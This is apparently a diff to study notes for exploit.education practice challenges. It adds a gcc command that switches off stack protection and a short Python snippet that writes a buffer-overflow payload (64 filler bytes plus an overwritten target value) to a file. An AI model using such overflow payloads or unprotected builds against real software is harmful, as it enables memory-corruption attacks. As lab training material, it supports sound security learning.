@@ -2,7 +2,13 @@
   https://exploit.education/
   ```
   gcc -fno-stack-protector -z execstack -g challenge.c -o s0
+
+  target = b'\x49\x6c\x59\x62'
+  payload = b'A' * 64 + target[::-1]
+  open('payload_one','wb').write(payload)
+
   
+
   ```
   
 # GDB
